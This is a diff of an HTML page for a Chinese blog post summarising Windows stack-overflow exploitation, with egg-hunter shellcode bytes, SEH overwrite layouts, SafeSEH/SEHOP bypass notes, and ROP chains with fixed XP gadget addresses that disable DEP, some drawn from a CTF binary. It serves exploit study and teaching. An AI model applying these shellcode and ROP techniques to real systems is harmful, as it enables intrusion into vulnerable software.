@@ -177,11 +177,12 @@
             </div>
             <h2 class="post-title">Windows下栈溢出利用总结</h2>
             <div class="post-meta">
-                本文总共10157个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共14579个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
-            <h3 id="Windows下栈溢出利用"><a href="#Windows下栈溢出利用" class="headerlink" title="Windows下栈溢出利用"></a>Windows下栈溢出利用</h3><h4 id="JMP-ESP"><a href="#JMP-ESP" class="headerlink" title="JMP ESP"></a>JMP ESP</h4><ul>
+            <h3 id="Windows下栈溢出利用"><a href="#Windows下栈溢出利用" class="headerlink" title="Windows下栈溢出利用"></a>Windows下栈溢出利用</h3><h4 id="一般技巧"><a href="#一般技巧" class="headerlink" title="一般技巧"></a>一般技巧</h4><ul>
+<li><h5 id="JMP-ESP"><a href="#JMP-ESP" class="headerlink" title="JMP ESP"></a>JMP ESP</h5><ul>
 <li>作为一种经典的利用方式，不应该被忘记。<ul>
 <li>在XP及之前的系统中，很多固定的地址有这样的指令。且并没有DEP保护。</li>
 <li>除了系统的，在程序自身的代码中，也可能找到jmp esp。</li>
@@ -189,15 +190,17 @@
 </ul>
 </li>
 </ul>
-<h4 id="Short-jmp"><a href="#Short-jmp" class="headerlink" title="Short jmp"></a>Short jmp</h4><ul>
+</li>
+<li><h5 id="Short-Jmp"><a href="#Short-Jmp" class="headerlink" title="Short Jmp"></a>Short Jmp</h5><ul>
 <li>当shellcode的一部分执行，一部分却中断时。可以使用这种方式“滑梯式”地完成利用。</li>
 <li>一般这种方式，也可以利用第一种方式填充合适的nop来完成。</li>
 </ul>
-<h4 id="Egg-hnter"><a href="#Egg-hnter" class="headerlink" title="Egg hnter"></a>Egg hnter</h4><ul>
+</li>
+<li><h5 id="Egg-hunter"><a href="#Egg-hunter" class="headerlink" title="Egg hunter"></a>Egg hunter</h5><ul>
 <li><p>当缓冲区空间不够大时，我们可以利用这种技术，写入一段用来搜索shellcode的代码，搜索真正的shellcode执行。</p>
 </li>
 <li><p>该技术可以在多个平台使用，只是实现的依赖不同 。</p>
-<ul>
+</li>
 <li>Linux下，依赖system call来处理搜索过程的“非法访问”<ul>
 <li>常用的有access(0x21)、和sigaction（0x43），前者每次检查一个地址（4byte），后者可以检查16byte。</li>
 </ul>
@@ -209,17 +212,16 @@
 </li>
 <li>示例基于NtDisplayString技术</li>
 </ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">6681</span>CAFF0F     <span class="keyword">or</span> dx,<span class="number">0x0fff</span>            ;通过添加循环遍历内存中的页面</span><br><span class="line">  <span class="number">42</span>             inc edx                    ;循环遍历每一个地址                </span><br><span class="line">  <span class="number">52</span>             push edx                ;入栈操作                </span><br><span class="line">  <span class="number">6</span>A43         push byte +<span class="number">0x43</span>         ;NtDisplayString的系统调用ID            </span><br><span class="line">  <span class="number">58</span>             pop eax                 ;出栈操作，其实就是作参数</span><br><span class="line">  CD2E         <span class="keyword">int</span> <span class="number">0x2e</span>                 ;调用NtDisplayString            </span><br><span class="line">  <span class="number">3</span>C05        cmp al,<span class="number">0x5</span>                 ;对比操作</span><br><span class="line">  <span class="number">5</span>A            pop edx                    ;出栈操作                </span><br><span class="line">  <span class="number">74</span>EF        jz <span class="number">0x0</span>                     ;如果ZF标志由CMP指令设置，则存在访问冲突</span><br><span class="line">  ;无效页面，回到顶部</span><br><span class="line">  B874303077    mov eax,<span class="number">0x7a757368</span>        ;标签(<span class="number">7</span>a <span class="number">75</span> <span class="number">73</span> <span class="number">68</span> = zush) </span><br><span class="line">  <span class="number">8B</span>FA        mov edi,edx                ;将EDI设置为EDX的当前地址指针以用于SCASD指令        </span><br><span class="line">  AF            scasd                     ;将EAX中的值与DWORD值进行比较</span><br><span class="line">  ;在SCASD比较后相应地设置EFLAGS寄存器,这里比较两次才算真正的发现shellcode</span><br><span class="line">  <span class="number">75</span>EA        jnz <span class="number">0x5</span> </span><br><span class="line">  AF            scasd                                                 </span><br><span class="line">  <span class="number">75E7</span>        jnz <span class="number">0x5</span></span><br><span class="line">FFE7        jmp edi</span><br><span class="line">  </span><br><span class="line">  <span class="string">"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"</span></span><br><span class="line">  egg</span><br><span class="line">  <span class="string">"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6681</span>CAFF0F     <span class="keyword">or</span> dx,<span class="number">0x0fff</span>            ;通过添加循环遍历内存中的页面</span><br><span class="line"><span class="number">42</span>             inc edx                    ;循环遍历每一个地址                </span><br><span class="line"><span class="number">52</span>             push edx                ;入栈操作                </span><br><span class="line"><span class="number">6</span>A43         push byte +<span class="number">0x43</span>         ;NtDisplayString的系统调用ID            </span><br><span class="line"><span class="number">58</span>             pop eax                 ;出栈操作，其实就是作参数</span><br><span class="line">CD2E         <span class="keyword">int</span> <span class="number">0x2e</span>                 ;调用NtDisplayString            </span><br><span class="line"><span class="number">3</span>C05        cmp al,<span class="number">0x5</span>                 ;对比操作</span><br><span class="line"><span class="number">5</span>A            pop edx                    ;出栈操作                </span><br><span class="line"><span class="number">74</span>EF        jz <span class="number">0x0</span>                     ;如果ZF标志由CMP指令设置，则存在访问冲突</span><br><span class="line">;无效页面，回到顶部</span><br><span class="line">B874303077    mov eax,<span class="number">0x7a757368</span>        ;标签(<span class="number">7</span>a <span class="number">75</span> <span class="number">73</span> <span class="number">68</span> = zush) </span><br><span class="line"><span class="number">8B</span>FA        mov edi,edx                ;将EDI设置为EDX的当前地址指针以用于SCASD指令        </span><br><span class="line">AF            scasd                     ;将EAX中的值与DWORD值进行比较</span><br><span class="line">;在SCASD比较后相应地设置EFLAGS寄存器,这里比较两次才算真正的发现shellcode</span><br><span class="line"><span class="number">75</span>EA        jnz <span class="number">0x5</span> </span><br><span class="line">AF            scasd                                                 </span><br><span class="line"><span class="number">75E7</span>        jnz <span class="number">0x5</span></span><br><span class="line">FFE7        jmp edi</span><br><span class="line"></span><br><span class="line"><span class="string">"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"</span></span><br><span class="line">egg</span><br><span class="line"><span class="string">"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>注意，这种方式利用，最终执行的shellcode不一定是在栈上，很可能在内存中其他的地方也会有我们输入的copy内容。</li>
 <li>hunter里面有一个egg，所以作为有效payload的标志就应该是两个egg。</li>
 </ul>
-<h4 id="SEH-HANDLER覆盖"><a href="#SEH-HANDLER覆盖" class="headerlink" title="SEH  HANDLER覆盖"></a>SEH  HANDLER覆盖</h4><ul>
+</li>
+<li><h5 id="SEH-HANDLER覆盖"><a href="#SEH-HANDLER覆盖" class="headerlink" title="SEH  HANDLER覆盖"></a>SEH  HANDLER覆盖</h5><ul>
 <li><p>栈溢出经常会导致内存的非法访问（读、写、执行），触发异常。而鉴于<a href="">Windows的SEH机制</a>，且SEH结构存在栈上。</p>
-<p>​    <img src="/2019/10/04/Windows下栈溢出利用总结/1.png" title="[]"></p>
-<p>​    <img src="/2019/10/04/Windows下栈溢出利用总结/2.png" title="[]"></p>
+<p>​     <img src="/2019/10/04/Windows下栈溢出利用总结/1.png" title="[]"></p>
+<p>​     <img src="/2019/10/04/Windows下栈溢出利用总结/2.png" title="[]"></p>
 </li>
 <li><p>溢出利用。我们可以覆盖SEH链，每个SEH结构有两个指针，第一个指向下一个SEH结构，第二个指向当前SEH的处理函数。组合利用如下</p>
 <ul>
@@ -230,6 +232,8 @@
 <li><p>执行”pop pop ret”，将下一条记录的值作为EIP。跳转到shellcode。</p>
 </li>
 <li><p>覆盖布置</p>
+</li>
+</ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">junk + nseh + seh + nops + shellcode</span><br><span class="line">					<span class="comment">#nseh is the shellcode_addr or jmp to shellcode or egg hunter</span></span><br><span class="line">    				<span class="comment">#seh is "pop pop ret"'s addr</span></span><br></pre></td></tr></table></figure>
 </li>
 </ul>
@@ -248,6 +252,7 @@
 <ol start="2">
 <li>如果异常处理函数的指针指向当前程序的栈中，则终止异常处理调用。</li>
 <li>在前两项检查都通过后，调用 RtlIsValidHandler() 进行异常处理有效性检查。</li>
+<li>绕过的话，一般找没有启用safeseh的模块里的”pop pop ret”来绕过。</li>
 </ol>
 </li>
 <li><h5 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h5><ul>
@@ -256,8 +261,20 @@
 <li><p>SEHOP的全称是Structured Exception Handler Overwrite Protection（结构化<br>异常处理覆盖保护）,SEHOP的核心是检测程序栈中的所有SEH结构链表，特<br>别是最后一个SEH结构，它拥有一个特殊的异常处理函数指针，指向的是一<br>个位于NTDLL中的函数。异常处理时，由系统接管分发异常处理，因此上面<br>描述的检测方案完全可以由系统独立来完成，正因为SEH的这种与应用程序<br>的无关性，因此应用程序不用做任何改变，你只需要确认你的系统开启了<br>SEHOP即可。</p>
 <img src="/2019/10/04/Windows下栈溢出利用总结/17.png" title="[]">
 </li>
+<li><p>详细介绍及绕过方法<a href="[https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/EN-Bypassing%20SEHOP.pdf](https://repo.zenk-security.com/Techniques d.attaques  .  Failles/EN-Bypassing SEHOP.pdf">Paper</a>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SEH handler should point onto a non-SafeSEH module</span><br><span class="line">• The page should be executable</span><br><span class="line">• The SEH chain should not be altered and must end with a SEH structure containing a special</span><br><span class="line">value (0xFFFFFFFF as next SEH structure pointer and a specific value as SEH handler)</span><br><span class="line">• All SEH structures should be 4-byte aligned</span><br><span class="line">• Last SEH structure&apos;s handler should point right into ntdll to ntdll!FinalExceptionHandler routine</span><br><span class="line">• All SEH pointers should point to stack locations</span><br></pre></td></tr></table></figure>
+</li>
 </ul>
 </li>
+</ul>
+<ul>
+<li>利用je指令0x74是地址对齐的，可以绕过检查；然后就是伪造SEH。这里为了让JE指令生效，handler覆盖不再是’pop pop ret’，而是’xor pop pop ret’。</li>
+</ul>
+<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><ul>
+<li>Canary</li>
+<li>SAFESEH</li>
+<li>SEHOP</li>
+<li>DEP</li>
 </ul>
 <h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><ul>
 <li><h5 id="HALLIBURTON-LOGVIEW-PRO-9-7-5-、10-0-1拒绝服务漏洞"><a href="#HALLIBURTON-LOGVIEW-PRO-9-7-5-、10-0-1拒绝服务漏洞" class="headerlink" title="HALLIBURTON LOGVIEW PRO 9.7.5 、10.0.1拒绝服务漏洞"></a>HALLIBURTON LOGVIEW PRO 9.7.5 、10.0.1拒绝服务漏洞</h5></li>
@@ -357,9 +374,7 @@
 </li>
 </ul>
 <pre><code>可以看到，已经执行了&quot;pop pop ret&quot;，且来到了指令&quot;\x41\x00\x71&quot;。
-
 ​    {% asset_img 14.png [] %}
-
      {% asset_img 15.png [] %}
 </code></pre><ul>
 <li><h6 id="shellcode的布置"><a href="#shellcode的布置" class="headerlink" title="shellcode的布置"></a>shellcode的布置</h6><ul>
@@ -403,8 +418,17 @@
 </ul>
 <ul>
 <li><h5 id="ROP方式绕过DEP"><a href="#ROP方式绕过DEP" class="headerlink" title="ROP方式绕过DEP"></a>ROP方式绕过DEP</h5><ul>
-<li><p>和Linux下的绕过NX类似，圣斗士通过ROP chain来完成。</p>
+<li><p>和Linux下的绕过NX类似，都是通过ROP chain来完成。</p>
+<ul>
+<li><p>不同的是构造多个函数调用形成chain，由于Windwos在执行完系统调用后销毁参数空间，所以不会出现第二个函数的参数和第一个函数参数重合的情况。易于构造chain，只需要将参数和返回地址连续布置即可。如VirtuaAlloc和Memcpy连续调用的布置。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. pointer to VirtualAlloc</span><br><span class="line">  2. pointer to memcpy  (return address field of VirtualAlloc()). When VirtualAlloc ends, it will return to this address</span><br><span class="line">3. lpAddress : arbitrary address (where to allocate new memory. Example 0x00200000)</span><br><span class="line">  4. size (how big should new memory allocation be)</span><br><span class="line">5. flAllocationType (0x1000 : MEM_COMMIT)</span><br><span class="line">  6. flProtect (0x40 :  PAGE_EXECUTE_READWRITE)</span><br><span class="line">7. Arbitrary address (same address as lpAddress, this param here will used to jump to shellcode after memcpy() returns). This field is the first parameter to the memcpy() function</span><br><span class="line">  8. Arbitrary address (again, same address as lpAddress. Parameter here will be used as destination address for memcpy() ). This field is the second parameter to the memcpy() function</span><br><span class="line">9. Address of shellcode ( = source parameter for memcpy()). This will be the 3rd parameter to the memcpy() function</span><br><span class="line">  10. Size : size parameter for memcpy(). This is the last parameter for the memcpy() function</span><br></pre></td></tr></table></figure>
 </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
 <li><p>不同的是，Windows下，我们可以先rop调用WIN API来关闭DEP保护或者重新定义属性，再执行位于stack上的shellcode。可用的WIN API如下</p>
 <p>​    <img src="/2019/10/04/Windows下栈溢出利用总结/17.png" title="[]"></p>
 </li>
@@ -415,19 +439,73 @@
 </li>
 <li><p>这样，在执行API关闭DEP之后，就可以顺利进入shellcode（仍然在stack中）。</p>
 </li>
-<li><p>以ISCC 2014的一个pwn为例(shellcode.exe)，这里选用的API是SetProcessPolicy。</p>
+<li><p>以ISCC 2014的一个pwn为例(shellcode.exe)，这里选用的API是<strong>SetProcessPolicy</strong>。</p>
 <ul>
 <li>确定偏移….</li>
 <li>主要是rop_chain的构造。</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> rop_gadgets = [</span><br><span class="line"><span class="number">0x7c801d5d</span>,  <span class="comment">#RETN</span></span><br><span class="line"><span class="number">0x90909090</span>,  <span class="comment">#nops</span></span><br><span class="line">   <span class="number">0x7c863e63</span>,  <span class="comment"># POP EBP # RETN [kernel32.dll] </span></span><br><span class="line">   <span class="number">0x7c862144</span>,  <span class="comment"># SetProcessDEPPolicy() [kernel32.dll]</span></span><br><span class="line">   <span class="number">0x7c80dfdd</span>,  <span class="comment"># POP EBX # RETN [kernel32.dll] </span></span><br><span class="line">   <span class="number">0x00000000</span>,  <span class="comment"># dwFlag</span></span><br><span class="line">   <span class="number">0x7c810afe</span>,  <span class="comment"># POP EDI # RETN [kernel32.dll] </span></span><br><span class="line">   <span class="number">0x7c810afe</span>,  <span class="comment"># skip 4 bytes [kernel32.dll]</span></span><br><span class="line">   <span class="number">0x77d23ad9</span>,  <span class="comment"># PUSHAD # RETN  [User32.dll]</span></span><br><span class="line"> ]</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<pre><code>* 注意，如果不可以传&apos;\x00&apos;这样的字节，可以通过指令运算来完成。
+* 这里有个有趣的，调试过程中发现如果在0x7c801d5d下了断点，shellcode就会异常中断。猜测是由于断点的地方改变了一个字节。
+</code></pre><ul>
+<li><h4 id="NtSetInformationProcess（驻留在ntdll的LdrpCheckNXCompatibility）关闭DEP"><a href="#NtSetInformationProcess（驻留在ntdll的LdrpCheckNXCompatibility）关闭DEP" class="headerlink" title="NtSetInformationProcess（驻留在ntdll的LdrpCheckNXCompatibility）关闭DEP"></a>NtSetInformationProcess（驻留在ntdll的LdrpCheckNXCompatibility）关闭DEP</h4><ul>
+<li><p>ret2libc方式调用（需要在stack上布置参数）</p>
 <ul>
-<li>注意，如果不可以传’\x00’这样的字节，可以通过指令运算来完成。</li>
-<li>这里有个有趣的，调试过程中发现如果在0x7c801d5d下了断点，shellcode就会异常中断。猜测是由于断点的地方改变了一个字节。</li>
+<li>类似与ROP</li>
+</ul>
+</li>
+<li><p>利用ntdll的特殊代码，引导执行。</p>
+<ul>
+<li><p>执行DEP关闭的操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;</span><br><span class="line"></span><br><span class="line">NtSetInformationProcess(</span><br><span class="line">   NtCurrentProcess(),    <span class="comment">// (HANDLE)-1</span></span><br><span class="line">   ProcessExecuteFlags,   <span class="comment">// 0x22</span></span><br><span class="line">   &amp;ExecuteFlags,         <span class="comment">// ptr to 0x2</span></span><br><span class="line">   <span class="keyword">sizeof</span>(ExecuteFlags)); <span class="comment">// 0x4</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>XP1及之前LdrpCheckNXCompatibility在内部调用NtSetInformationProcess， XP2及XP3之后是ZWSetInformation，当满足一定条件时，就可以自动执行关闭DEP的操作。</p>
+</li>
+<li><p>在windbg里分析LdrpCheckNXCompatibility(XP3)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ntdll!LdrpCheckNXCompatibility:</span><br><span class="line">7c93cd11 8bff            mov     edi,edi</span><br><span class="line">7c93cd13 55              push    ebp</span><br><span class="line">7c93cd14 8bec            mov     ebp,esp</span><br><span class="line">7c93cd16 51              push    ecx</span><br><span class="line">7c93cd17 8365fc00        and     dword ptr [ebp-4],0</span><br><span class="line">7c93cd1b 56              push    esi</span><br><span class="line">7c93cd1c ff7508          push    dword ptr [ebp+8]</span><br><span class="line">7c93cd1f e887ffffff      call    ntdll!LdrpCheckSafeDiscDll (7c93ccab)</span><br><span class="line">7c93cd24 3c01            cmp     al,1			#第一目标</span><br><span class="line">7c93cd26 6a02            push    2</span><br><span class="line">7c93cd28 5e              pop     esi			#esi = 2</span><br><span class="line">7c93cd29 0f84df290200    je      ntdll!LdrpCheckNXCompatibility+0x1a (7c95f70e)</span><br><span class="line">												#第二目标</span><br><span class="line">0:000&gt; u 0x7c95f70e</span><br><span class="line">ntdll!LdrpCheckNXCompatibility+0x1a:</span><br><span class="line">7c95f70e 8975fc          mov     dword ptr [ebp-4],esi	#存储2的  一个指针</span><br><span class="line">7c95f711 e919d6fdff      jmp     ntdll!LdrpCheckNXCompatibility+0x1d (7c93cd2f)</span><br><span class="line">												#第三目标</span><br><span class="line">ntdll!LdrpCheckNXCompatibility+0x1d:</span><br><span class="line">7c93cd2f 837dfc00        cmp     dword ptr [ebp-4],0  #这里2 != 0， 跳转成功</span><br><span class="line">7c93cd33 0f85f89a0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7c956831)</span><br><span class="line">								</span><br><span class="line">0:000&gt; u 0x7c956831</span><br><span class="line">ntdll!LdrpCheckNXCompatibility+0x4d:</span><br><span class="line">7c956831 6a04            push    4					#关闭DEP的参数</span><br><span class="line">7c956833 8d45fc          lea     eax,[ebp-4]</span><br><span class="line">7c956836 50              push    eax</span><br><span class="line">7c956837 6a22            push    22h</span><br><span class="line">7c956839 6aff            push    0FFFFFFFFh			#执行函数</span><br><span class="line">7c95683b e84074fdff      call    ntdll!ZwSetInformationProcess (7c92dc80)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>因此，只需要满足当eax = 1的时候，转到LdrpCheckNXCompatibility的cmp al 1的语句，我们就可以让这一代码段关闭DEP。</p>
+</li>
+<li><p>在执行关闭DEP的前，XP1有对edp的一些内存操作，XP2之后在关闭DEP后有对esi的一些操作。需要满足一定的条件（可写等）。一般让二者在esp附近。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push esp, pop ebp, ret</span><br><span class="line">push esp. pop esi, ret</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>很遗憾的是，在XP1和XP2上都成功了，但是在XP3上失败了，没能够跳到shellcode（继续研究吧）</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h5 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h5><ul>
+<li><p>在该函数内部依次调用如下函数</p>
+<ul>
+<li>ZwProtectVirtualMemory 用来确保目的地址有可写权限</li>
+<li>ZwWriteVirtualMemory </li>
+<li>ZwFlushInstructionCache</li>
+<li>ZwWriteVirtualMemory</li>
 </ul>
 </li>
 </ul>
 </li>
+</ul>
+<ul>
+<li><h5 id="SEH绕过DEP"><a href="#SEH绕过DEP" class="headerlink" title="SEH绕过DEP"></a>SEH绕过DEP</h5><ul>
+<li>一般的SEH利用，我们会在nSEH处（stack上）放一个jumpcode，显然在DEP开启的时候是不行的。</li>
+<li>这样的情况下，我们需要变一下SEH，覆盖为”pop pop pop esp; ret”。这样会吧nSEH当作一个指针，会跳转到nSEH内容里，可以在nSEH处覆盖前面提到的绕过DEP的第一个地址。（ntdll下的LdrpCheckNXCompatibility）。</li>
+</ul>
+</li>
+<li><h5 id="ALSR绕过"><a href="#ALSR绕过" class="headerlink" title="ALSR绕过"></a>ALSR绕过</h5><ul>
+<li>EIP部分覆盖<ul>
+<li>有用代码地址和EIP的随机部分一致，只需要覆盖低位</li>
+</ul>
+</li>
+<li>使用未开启ALSR的模块来绕过。</li>
+<li>当程序发生异常而不会崩溃的时候，可以爆破。</li>
+</ul>
+</li>
+</ul>
+<ul>
 <li><p>vtable覆盖绕过GS</p>
 <ul>
 <li><p>主要特点是利用虚表和字符串在同一函数栈帧下，溢出覆盖vtable指针的低位，使其指向字符串。（虚函数指针被控制）。</p>
@@ -449,8 +527,11 @@
 </li>
 </ul>
 </li>
+<li><p>当我们的输入和vtable不在同一地址空间下，除非我们可以在某一位置（已知地址）伪造一个函数指针，不然覆盖虚表指针只会异常，而难以执行任意代码。</p>
+</li>
 </ul>
 </li>
+<li></li>
 </ul>
 <p>参考链接</p>
 <p><a href="http://blog.nsfocus.net/tutorial-overflow/" target="_blank" rel="noopener">看教程学溢出之SEH利用</a></p>
